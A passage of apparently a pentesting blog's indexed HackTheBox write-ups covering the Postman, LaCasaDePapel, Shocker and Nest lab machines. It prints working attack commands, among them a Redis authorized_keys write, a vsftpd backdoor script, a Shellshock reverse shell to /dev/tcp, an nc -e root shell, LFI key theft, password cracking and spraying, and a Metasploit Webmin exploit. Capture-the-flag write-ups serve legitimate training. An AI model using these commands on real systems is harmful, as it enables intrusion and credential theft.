show:upload [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 44ms]fonts [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 43ms]js [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 2421ms]css [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 2423ms]images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 4453ms]server-status [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 46ms] [Status: 200, Size: 3844, Words: 1027, Lines: 92, Duration: 55ms]index.html [Status: 200, Size: 3844, Words: 1027, Lines: 92, Duration: 51ms].htaccess [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 42ms]style.css [Status: 200, Size: 24465, Words: 4058, Lines: 1422, Duration: 44ms]. [Status: 200, Size: 3844, Words: 1027, Lines: 92, Duration: 46ms]RedisWe can do a further enumeration of the Redis server:6379/tcp open redis Redis key-value store 4.0.9 (64 bits)| redis-info: | Version: 4.0.9| Operating System: Linux 4.15.0-58-generic x86_64| Architecture: 64 bits| Process ID: 668| Used CPU (sys): 1.62| Used CPU (user): 0.53| Connected clients: 1| Connected slaves: 0| Used memory: 821.52K| Role: master| Bind addresses: | 0.0.0.0| ::1| Client connections: |_ 10.10.14.7With redis-cli we will connect and get general information with info:$ redis-cli -h 10.10.10.16010.10.10.160:6379&gt; info# Serverredis_version:4.0.9Only the attack machine is connected:$ 10.10.10.160:6379&gt; client listid=16 addr=10.10.14.7:51346 fd=8 name= age=157 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=clientThere doesn’t seem to be any database:$ 10.10.10.160:6379&gt; info keyspace# Keyspace$ 10.10.10.160:6379&gt;The version is under **5.0**, so redis-rogue-server should work. But the shell doesn’t seem to work:$ python3 redis-rogue-server.py --rhost 10.10.10.160 --lhost 10.10.14.7[&lt;&lt;] whoami[&lt;&lt;] id[&lt;&lt;]Trying a webshell doesn’t success:10.10.10.160:6379&gt; config set dir /usr/share/apache2/default-siteOK10.10.10.160:6379&gt; config set dbfilename redis.phpOK10.10.10.160:6379&gt; set test \"&lt;?php phpinfo(); ?&gt;\"OK10.10.10.160:6379&gt; save(error) ERRWebminThis page is a typical webmin web:http://10.10.10.160:10000/ [200 OK] Country[RESERVED][ZZ], HTTPServer[MiniServ/1.910], IP[10.10.10.160]FootprintInitial AccessWe can try adding an SSH connection:$ ssh-keygen -t rsa$ (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") &gt; spaced_key.txt$ cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key OKAdd the SSH key:$ redis-cli -h 10.10.10.16010.10.10.160:6379&gt; config set dir /var/lib/redis/.sshOK10.10.10.160:6379&gt; config set dbfilename \"authorized_keys\"OK10.10.10.160:6379&gt; saveOKAnd we can connect:$ ssh -i id_rsa redis@10.10.10.160Privilege EscalationUserWe can get the user:redis@Postman:~$ ls /homeMattWe can get a list of all the avaible ports:redis@Postman:/$ nc -z -v 127.0.0.1 1-65535 2&gt;&amp;1 | grep -v 'Connection refused'Connection to 127.0.0.1 22 port [tcp/ssh] succeeded!Connection to 127.0.0.1 80 port [tcp/http] succeeded!Connection to 127.0.0.1 6379 port [tcp/*] succeeded!Connection to 127.0.0.1 10000 port [tcp/webmin] succeeded!Connection to 127.0.0.1 38582 port [tcp/*] succeeded!redis@Postman:/$ nc -z -v 127.0.0.1 1-65535 2&gt;&amp;1 | grep -v 'Connection refused'Connection to 127.0.0.1 22 port [tcp/ssh] succeeded!Connection to 127.0.0.1 80 port [tcp/http] succeeded!Connection to 127.0.0.1 6379 port [tcp/*] succeeded!Connection to 127.0.0.1 10000 port [tcp/webmin] succeeded!Connection to 127.0.0.1 41690 port [tcp/*] succeeded!Connection to 127.0.0.1 54148 port [tcp/*] succeeded!Some ports are moving, so we can ignore them. There is a RSA in /opt/id_rsa.bak owned by **Matt**. Cracking it display the following password:$ ssh2john id_rsa &gt; hash.txt$ john -w=/usr/share/wordlists/rockyou.txt hash.txt Created directory: /home/zeropio/.johnUsing default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashesCost 2 (iteration count) is 2 for all loaded hashesWill run 8 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuscomputer2008 (id_rsa)But using it will display an error:$ ssh Matt@10.10.10.160 -i id_rsaEnter passphrase for key 'id_rsa': Connection closed by 10.10.10.160 port 22But the password will work for the user:redis@Postman:/tmp$ su MattPassword: Matt@Postman:/tmp$RootWe can use this credentials for the webmin web. There, we can use metasploit:msf6&gt; use exploit/linux/http/webmin_packageup_rcemsf6 exploit(linux/http/webmin_packageup_rce) &gt; set username Mattmsf6 exploit(linux/http/webmin_packageup_rce) &gt; set password computer2008msf6 exploit(linux/http/webmin_packageup_rce) &gt; set lhost tun0msf6 exploit(linux/http/webmin_packageup_rce) &gt; set rhosts 10.10.10.160msf6 exploit(linux/http/webmin_packageup_rce) &gt; set ssl truemsf6 exploit(linux/http/webmin_packageup_rce) &gt; runAnd we are root." }, { "title": "HTB | LaCasaDePapel", "url": "/pentesting/htb/machines/lacasadepapel", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2022-12-31 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.422/tcp open ssh OpenSSH 7.9 (protocol 2.0)| ssh-hostkey: | 2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA)| 256 41e495a3390b25f9dadebe6adc59486d (ECDSA)|_ 256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519)80/tcp open http Node.js (Express middleware)|_http-title: La Casa De Papel443/tcp open ssl/http Node.js Express framework| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel| Not valid before: 2019-01-27T08:35:30|_Not valid after: 2029-01-24T08:35:30|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Server returned status 401 but no WWW-Authenticate header.| tls-nextprotoneg: | http/1.1|_ http/1.0|_http-title: La Casa De PapelService Info: OS: UnixEnumerationFTPAnonymous login doesn’t work. But there is a vulnerability associated to this version:vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.pyWebWe found a web with a QR, Google Authenticator and an email:Fuzzing will show: [Status: 200, Size: 1754, Words: 197, Lines: 57, Duration: 293ms]qrcode [Status: 500, Size: 1039, Words: 50, Lines: 11, Duration: 302ms]favicon.ico [Status: 200, Size: 1406, Words: 2, Lines: 2, Duration: 51ms]In the page http://10.10.10.131/qrcode there is a error message that show the user **oslo**:Error: Bad data at encode (/home/oslo/node_modules/qr-image/lib/encode.js:147:15) at QR (/home/oslo/node_modules/qr-image/lib/qr-base.js:170:19) at Object.qr_image [as image] (/home/oslo/node_modules/qr-image/lib/qr.js:48:18) at /home/oslo/server.js:60:19 at Layer.handle [as handle_request] (/home/oslo/node_modules/express/lib/router/layer.js:95:5) at next (/home/oslo/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/home/oslo/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/home/oslo/node_modules/express/lib/router/layer.js:95:5) at /home/oslo/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/home/oslo/node_modules/express/lib/router/index.js:335:12)Scanning the QR doesn’t display anything.Inside the HTTPS page we see a certification issue:FootprintInitial AccessThe FTP vulnerability doesn’t seem to work:$ python3 49757.py 10.10.10.131Success, shell openedSend `exit` to quit shellTraceback (most recent call last): File \"/home/zeropio/Pentesting/Exploits/49757.py\", line 32, in &lt;module&gt; tn2.interact() File \"/usr/lib/python3.10/telnetlib.py\", line 555, in interact sys.stdout.write(text.decode('ascii'))UnicodeDecodeError: 'ascii' codec can't decode byte 0xe2 in position 34: ordinal not in range(128)But with this code:#!/usr/bin/python# -*- coding: utf-8 -*-import socketimport osimport timedef exploit(ip, port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((ip, port)) sock.send('USER :)\\n') sock.send('PASS HTBPass\\n') time.sleep(2) sock.close() os.system('rlwrap nc 10.10.10.131 6200 -v')exploit('10.10.10.131', 21)We can get it work:$ python2 49757.py 10.10.10.131: inverse host lookup failed: Unknown host(UNKNOWN) [10.10.10.131] 6200 (?) openPsy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin HilemanWe got an PHP debugger shell.Also, we can exploit this vulnerability manually. First we can see that the port 6200 is closed:$ nc 10.10.10.131 6200(UNKNOWN) [10.10.10.131] 6200 (?) : Connection refusedWe need to send a FTP login with the string :) in the user field:$ nc 10.10.10.131 21 220 (vsFTPd 2.3.4)USER zero:)PASS zero331 Please specify the password.And now start a connection. We can use rlwrap to make it interactive:$ rlwrap nc 10.10.10.131 6200Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin HilemanSome functions are being blocked:shell_exec()PHP Fatal error: Call to undefined function shell_exec() in Psy Shell code on line 1Even though there are not direct execution, we can use other functions:scandir(\"/\")=&gt; [ \".\", \"..\", \".DS_Store\", \"._.DS_Store\", \"bin\", \"boot\", \"dev\", \"etc\", \"home\", \"lib\", \"lost+found\", \"media\", \"mnt\", \"opt\", \"proc\", \"root\", \"run\", \"sbin\", \"srv\", \"swap\", \"sys\", \"tmp\", \"usr\", \"var\", ]The list of users can be get:scandir(\"/home\")=&gt; [ \".\", \"..\", \"berlin\", \"dali\", \"nairobi\", \"oslo\", \"professor\", ]Searching we can find a certificate:file_get_contents(\"/home/nairobi/ca.key\")=&gt; \"\"\" -----BEGIN PRIVATE KEY-----\\n MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\\n 7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\\n. . . &lt;SNIP&gt; . . .Now we must create a certificate. First export the certificate from the HTTPS web:$ openssl req -new -key client.key -out client.csr$ openssl x509 -req -in client.csr -CA lacasadepapel_htb.crt -CAkey ca.key -set_serial 9001 -extensions client -days 9002 -outform PEM -out client.cer$ openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12Import client.pk12 to Your Certificates page and lacasadepapel_htb.crt to Authorities. Now reload the web:In the first session there is a bunch of files in the following format: https://10.10.10.131/file/U0VBU09OLTEvMDEuYXZp . It it encode as base64:$ echo \"U0VBU09OLTEvMDEuYXZp\" | base64 -dSEASON-1/01.aviWe can try a LFI encoding the path.$ echo -n '../.ssh/id_rsa' | base64Li4vLnNzaC9pZF9yc2E=Accessing the URL https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E= will download id_rsa. Testing each user, professor will grant us the shell:$ ssh professor@10.10.10.131 -i id_rsa _ ____ ____ ____ _ | | __ _ / ___|__ _ ___ __ _ | _ \\ ___ | _ \\ __ _ _ __ ___| || | / _` | | | / _` / __|/ _` | | | | |/ _ \\ | |_) / _` | '_ \\ / _ \\ || |__| (_| | | |__| (_| \\__ \\ (_| | | |_| | __/ | __/ (_| | |_) | __/ ||_____\\__,_| \\____\\__,_|___/\\__,_| |____/ \\___| |_| \\__,_| .__/ \\___|_| |_| lacasadepapel [~]$Privilege EscalationA weird file can be found there:lacasadepapel [~]$ cat memcached.ini [program:memcached]command = sudo -u nobody /usr/bin/node /home/professor/memcached.jsAs this folder is in the home user, we can move it and create other:lacasadepapel [~]$ mv memcached.ini memcached.ini.savelacasadepapel [~]$ printf '[program:memcached]\\ncommand = sudo -u root /usr/bin/nc 10.10.14.7 60002 -e /bin/sh\\n' &gt; /home/professor/memcached.iniNow wait for the reverse shell to start as root." }, { "title": "HTB | Shocker", "url": "/pentesting/htb/machines/shocker", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2022-12-30 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache/2.4.18 (Ubuntu)2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA)| 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)|_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelEnumerationThe first look at the page display the following:There aren’t much information at first view:http://10.10.10.56 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.56]Fuzzing show:server-status [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 47ms] [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 46ms]index.html [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 49ms]cgi-bin/ [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 49ms]With dirsearch a script can be found:$ dirsearch -u 'http://10.10.10.56/cgi-bin/' -e php,asp,txt,pl,py,sh...[18:38:10] 200 - 119B - /cgi-bin/user.shThe contents are:$ curl -i http://10.10.10.56/cgi-bin/user.sh HTTP/1.1 200 OKDate: Fri, 30 Dec 2022 18:41:09 GMTServer: Apache/2.4.18 (Ubuntu)Transfer-Encoding: chunkedContent-Type: text/x-shContent-Type: text/plainJust an uptime test script 13:41:09 up 46 min, 0 users, load average: 0.00, 0.03, 0.05The script is using the uptime command.FootprintInitial AccessUsing this reference we can try a shellshock attack:$ curl -A '() { :;}; echo \"Content-Type: text/plain\"; echo; /bin/cat /etc/passwd' http://10.10.10.56/cgi-bin/user.shroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/falsesyslog:x:104:108::/home/syslog:/bin/false_apt:x:105:65534::/nonexistent:/bin/falselxd:x:106:65534::/var/lib/lxd/:/bin/falsemessagebus:x:107:111::/var/run/dbus:/bin/falseuuidd:x:108:112::/run/uuidd:/bin/falsednsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/falsesshd:x:110:65534::/var/run/sshd:/usr/sbin/nologinshelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bashWe can try getting an SSH RSA to conect:$ curl -A '() { :;}; echo \"Content-Type: text/plain\"; echo; /bin/ls /home/shelly/.ssh' http://10.10.10.56/cgi-bin/user.shWe can send a shell opening a netcat and sending:$ curl -H \"User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.7/443 0&gt;&amp;1\" http://10.10.10.56/cgi-bin/user.shPrivilege EscalationWe can get an easy escalate with sudo -l:shelly@Shocker:/home/shelly$ sudo -lMatching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perlshelly@Shocker:/home/shelly$ sudo perl -e 'exec \"/bin/sh\";'sudo perl -e 'exec \"/bin/sh\";'whoamiroot" }, { "title": "HTB | Nest", "url": "/pentesting/htb/machines/nest", "categories": "Pentesting, HackTheBox", "tags": "htb, windows, easy, machines", "date": "2022-12-26 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION445/tcp open microsoft-ds?4386/tcp open unknown| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2| FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2| Unrecognised command| Help: | Reporting Service V1.2| This service allows users to run queries against databases using the legacy HQK format| AVAILABLE COMMANDS ---| LIST| SETDIR &lt;Directory_Name&gt;| RUNQUERY &lt;Query_ID&gt;| DEBUG &lt;Password&gt;|_ HELP &lt;Command&gt;1 service unrecognized despite returning data.EnumerationThe SMB server cannot be listed:$ smbclient -N -L \\\\\\\\10.10.10.178\\\\ Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share Data Disk IPC$ IPC Remote IPC Secure$ Disk Users DiskThe non-authenticate user doesn’t have access to the whole SMB, but it can download two files from Data and see the Users:$ smbclient -N \\\\\\\\10.10.10.178\\\\UsersTry \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Sat Jan 25 23:04:21 2020 .. D 0 Sat Jan 25 23:04:21 2020 Administrator D 0 Fri Aug 9 16:08:23 2019 C.Smith D 0 Sun Jan 26 07:21:44 2020 L.Frost D 0 Thu Aug 8 18:03:01 2019 R.Thompson D 0 Thu Aug 8 18:02:50 2019 TempUser D 0 Wed Aug 7 23:55:56 2019This are the files founded:$ cat Maintenance\\ Alerts.txt There is currently no scheduled maintenance work$ cat Welcome\\ Email.txt We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;You will find your home folder in the following location: \\\\HTB-NEST\\Users\\&lt;USERNAME&gt;If you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you.Username: TempUserPassword: welcome2019Thank youHRFootprintInitial AccessWe can test this credentials:$ crackmapexec smb 10.10.10.178 -u TempUser -p welcome2019SMB 10.10.10.178 445 HTB-NEST [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)SMB 10.10.10.178 445 HTB-NEST [+] HTB-NEST\\TempUser:welcome2019Now we can download a file from the TempUser folder;$ smbclient \\\\\\\\10.10.10.178\\\\Users -U TempUser -p 'welcome2019' Password for [WORKGROUP\\TempUser]:We can retreive a blank file from there. Going back to the user list, we can do a password spraying with them:$ crackmapexec smb 10.10.10.178 -u usernames.txt -p welcome2019 SMB 10.10.10.178 445 HTB-NEST [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)SMB 10.10.10.178 445 HTB-NEST [-] HTB-NEST\\C.Smith:welcome2019 STATUS_LOGON_FAILURE SMB 10.10.10.178 445 HTB-NEST [+] HTB-NEST\\L.Frost:welcome2019TempUser can access the Data folder with new directories we cannot access before. We can download the following files:.├── adobe│   ├── editing.xml│   ├── Options.txt│   ├── projects.xml│   └── settings.xml├── atlas│   └── Temp.XML├── microsoft│   └── Options.xml├── notepad│   ├── config.xml│   └── shortcuts.xml└── ru └── RU_config.xmlInside atlas/Temp.XML we found some references to usernames:&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;bs:Brainstorm\txmlns:bs=\"http://schemas.microsoft.com/visio/2003/brainstorming\"&gt;\t&lt;bs:topic bs:TopicID=\"T1\"&gt;\t\t&lt;bs:text&gt;Marketing Plan&lt;/bs:text&gt;\t\t&lt;bs:topic bs:TopicID=\"T1.1\"&gt;\t\t\t&lt;bs:text&gt;Product&lt;/bs:text&gt;\t\t\t&lt;bs:prop&gt;\t\t\t\t&lt;bs:id&gt;1&lt;/bs:id&gt;\t\t\t\t&lt;bs:label&gt;Assigned to&lt;/bs:label&gt;\t\t\t\t&lt;bs:value&gt;Deanna Meyer&lt;/bs:value&gt;\t\t\t&lt;/bs:prop&gt;\t\t\t&lt;bs:topic bs:TopicID=\"T1.1.1\"&gt;\t\t\t\t&lt;bs:text&gt;New features&lt;/bs:text&gt;\t\t\t&lt;/bs:topic&gt;\t\t\t&lt;bs:topic bs:TopicID=\"T1.1.2\"&gt;\t\t\t\t&lt;bs:text&gt;Competitive strengths&lt;/bs:text&gt;\t\t\t&lt;/bs:topic&gt;\t\t\t&lt;bs:topic bs:TopicID=\"T1.1.3\"&gt;\t\t\t\t&lt;bs:text&gt;Competitive weaknesses&lt;/bs:text&gt;\t\t\t&lt;/bs:topic&gt;\t\t&lt;/bs:topic&gt;\t\t&lt;bs:topic bs:TopicID=\"T1.2\"&gt;\t\t\t&lt;bs:text&gt;Placement&lt;/bs:text&gt;\t\t\t&lt;bs:prop&gt;\t\t\t\t&lt;bs:id&gt;1&lt;/bs:id&gt;\t\t\t\t&lt;bs:label&gt;Assigned to&lt;/bs:label&gt;\t\t\t\t&lt;bs:value&gt;Jolie Lenehan&lt;/bs:value&gt;\t\t\t&lt;/bs:prop&gt;\t\t&lt;/bs:topic&gt;\t\t&lt;bs:topic bs:TopicID=\"T1.3\"&gt;\t\t\t&lt;bs:text&gt;Price&lt;/bs:text&gt;\t\t\t&lt;bs:prop&gt;\t\t\t\t&lt;bs:id&gt;1&lt;/bs:id&gt;\t\t\t\t&lt;bs:label&gt;Assigned to&lt;/bs:label&gt;\t\t\t\t&lt;bs:value&gt;Robert O'Hara&lt;/bs:value&gt;\t\t\t&lt;/bs:prop&gt;\t\t&lt;/bs:topic&gt;\t\t&lt;bs:topic bs:TopicID=\"T1.4\"&gt;\t\t\t&lt;bs:text&gt;Promotion&lt;/bs:text&gt;\t\t\t&lt;bs:prop&gt;\t\t\t\t&lt;bs:id&gt;1&lt;/bs:id&gt;\t\t\t\t&lt;bs:label&gt;Assigned to&lt;/bs:label&gt;\t\t\t\t&lt;bs:value&gt;Robert O'Hara&lt;/bs:value&gt;\t\t\t&lt;/bs:prop&gt;\t\t\t&lt;bs:topic bs:TopicID=\"T1.4.1\"&gt;\t\t\t\t&lt;bs:text&gt;Advertising&lt;/bs:text&gt;\t\t\t&lt;/bs:topic&gt;\t\t\t&lt;bs:topic bs:TopicID=\"T1.4.2\"&gt;\t\t\t\t&lt;bs:text&gt;Mailings&lt;/bs:text&gt;\t\t\t&lt;/bs:topic&gt;\t\t\t&lt;bs:topic bs:TopicID=\"T1.4.3\"&gt;\t\t\t\t&lt;bs:text&gt;Trade shows&lt;/bs:text&gt;\t\t\t&lt;/bs:topic&gt;\t\t&lt;/bs:topic&gt;\t&lt;/bs:topic&gt;\t&lt;bs:association bs:topic1=\"T1.4\" bs:topic2=\"T1.3\"/&gt;&lt;/bs:Brainstorm&gt;We have here Deanna Meyer and Robert O’Hara, following the previous user we can get it as D.Meyer and R.Ohara.We also found references to a file, with a new user Carl:&lt;File filename=\"C:\\windows\\System32\\drivers\\etc\\hosts\" /&gt;&lt;File filename=\"\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\" /&gt;&lt;File filename=\"C:\\Users\\C.Smith\\Desktop\\todo.txt\" /&gt;The file ru/RU_config.xml contents a pair of credentials:&lt;?xml version=\"1.0\"?&gt;&lt;ConfigFile xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt; &lt;Port&gt;389&lt;/Port&gt; &lt;Username&gt;c.smith&lt;/Username&gt; &lt;Password&gt;&lt;/Password&gt;&lt;/ConfigFile&gt;If we search that port we found that it is filtered:PORT STATE SERVICE VERSION389/tcp filtered ldapWe cannot access \\\\\\\\10.10.10.178\\\\Secure$\\IT\\, but we can access \\\\\\\\10.10.10.178\\\\Secure$\\IT\\Carl:$ smbmap -H 10.10.10.178 -u TempUser -p welcome2019 -R 'Secure$\\IT\\Carl'[+] IP: 10.10.10.178:445 Name: HTB-NEST Disk Permissions Comment ---- ----------- ------- Secure$ READ ONLY .\\Secure$IT\\Carl\\* dr--r--r-- 0 Wed Jul 21 19:47:13 2021 . dr--r--r-- 0 Wed Jul 21 19:47:13 2021 .. dr--r--r-- 0 Wed Jul 21 19:47:13 2021 Docs dr--r--r-- 0 Tue Aug 6 14:45:47 2019 Reports dr--r--r-- 0 Tue Aug 6 15:41:55 2019 VB Projects .\\Secure$IT\\Carl\\Docs\\* dr--r--r-- 0 Wed Jul 21 19:47:13 2021 . dr--r--r-- 0 Wed Jul 21 19:47:13 2021 .. fr--r--r-- 56 Wed Jul 21 19:47:13 2021 ip.txt fr--r--r-- 73 Wed Jul 21 19:47:13 2021 mmc.txt .\\Secure$IT\\Carl\\VB Projects\\* dr--r--r-- 0 Tue Aug 6 15:41:55 2019 . dr--r--r-- 0 Tue Aug 6 15:41:55 2019 .. dr--r--r-- 0 Tue Aug 6 15:41:53 2019 Production dr--r--r-- 0 Tue Aug 6 15:47:41 2019 WIP .\\Secure$IT\\Carl\\VB Projects\\WIP\\* dr--r--r-- 0 Tue Aug 6 15:47:41 2019 . dr--r--r-- 0 Tue Aug 6 15:47:41 2019 .. dr--r--r-- 0 Wed Jul 21 19:47:17 2021 RU .\\Secure$IT\\Carl\\VB Projects\\WIP\\RU\\* dr--r--r-- 0 Wed Jul 21 19:47:17 2021 . dr--r--r-- 0 Wed Jul 21 19:47:17 2021 .. dr--r--r-- 0 Wed Jul 21 19:47:14 2021 RUScanner fr--r--r-- 871 Wed Jul 21 19:47:17 2021 RUScanner.sln .\\Secure$IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\* dr--r--r-- 0 Wed Jul 21 19:47:14 2021 . dr--r--r-- 0 Wed Jul 21 19:47:14 2021 .. dr--r--r-- 0 Wed Aug 7 21:00:11 2019 bin fr--r--r-- 772 Wed Jul 21 19:47:15 2021 ConfigFile.vb fr--r--r-- 279 Wed Jul 21 19:47:15 2021 Module1.vb dr--r--r-- 0 Wed Aug 7 21:00:11 2019 My Project dr--r--r-- 0 Wed Aug 7 21:00:11 2019 obj fr--r--r-- 4828 Wed Jul 21 19:47:14 2021 RU Scanner.vbproj fr--r--r-- 143 Wed Jul 21 19:47:13 2021 RU Scanner.vbproj.user fr--r--r-- 133 Wed Jul 21 19:47:14 2021 SsoIntegration.vb fr--r--r-- 4888 Wed Jul 21 19:47:15 2021 Utils.vbMount the SMB to have a better control:$ sudo mount -t cifs -o ro,username=TempUser,password=welcome2019 '//10.10.10.178/Secure$' /mnt/smbNow we can access the Secure$/IT/Carl folder. Searching in it we found a suspicious file, Utils.vb which decrypt the previous founded password. We can convert this Visual Basic code into C# and then use Mono to create a binary:using System;using System.IO;using System.Text;using System.Security.Cryptography;namespace Dec { class Decryptor { public static void Main() { var pt = Decrypt(\"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\", \"N3st22\", \"88552299\", 2, \"464R5DFA5DL6LE28\", 256); Console.WriteLine(\"Plaintext: \" + pt); } public static String Decrypt(String cipherText, String passPhrase, String saltValue, int passwordIterations, String initVector, int keySize) { var initVectorBytes = Encoding.ASCII.GetBytes(initVector); var saltValueBytes = Encoding.ASCII.GetBytes(saltValue); var cipherTextBytes = Convert.FromBase64String(cipherText); var password = new Rfc2898DeriveBytes(passPhrase, saltValueBytes, passwordIterations); var keyBytes = password.GetBytes(keySize / 8); var symmetricKey = new AesCryptoServiceProvider(); symmetricKey.Mode = CipherMode.CBC; var decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes); var memoryStream = new MemoryStream(cipherTextBytes); var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read); var plainTextBytes = new byte[cipherTextBytes.Length]; var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length); memoryStream.Close(); cryptoStream.Close(); var plainText = Encoding.ASCII.GetString(plainTextBytes, 0, decryptedByteCount); return plainText; } }}$ mcs decrypt.cs$ ./decrypt.exe Plaintext: xRxRxPANCAK3SxRxRxWe can test the credentials now:$ crackmapexec smb 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRxSMB 10.10.10.178 445 HTB-NEST [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)SMB 10.10.10.178 445 HTB-NEST [+] HTB-NEST\\C.Smith:xRxRxPANCAK3SxRxRx$ smbmap -H 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRx [+] IP: 10.10.10.178:445 Name: HTB-NEST Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share Data READ ONLY IPC$ NO ACCESS Remote IPC Secure$ READ ONLY Users READ ONLYPrivilege EscalationWe will download all the files that we can access with this user:$ smbmap -H 10.10.10.178 -u C.Smith -p 